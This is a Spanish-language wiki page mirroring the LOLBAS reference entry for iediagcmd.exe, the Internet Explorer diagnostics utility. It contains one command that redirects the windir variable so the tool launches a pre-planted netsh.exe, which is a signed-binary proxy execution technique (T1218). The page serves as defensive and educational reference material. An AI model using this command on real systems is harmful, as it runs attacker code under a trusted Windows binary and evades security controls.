# LOLBAS: iediagcmd.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Execute`

Diagnostics Utility for Internet Explorer

## Comandos

### Spawn a pre-planted executable from iediagcmd.exe.

Execute · priv: User · T1218

```cmd
set windir=c:\test& cd "C:\Program Files\Internet Explorer\" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}
```

Executes binary that is pre-planted at C:\test\system32\netsh.exe.

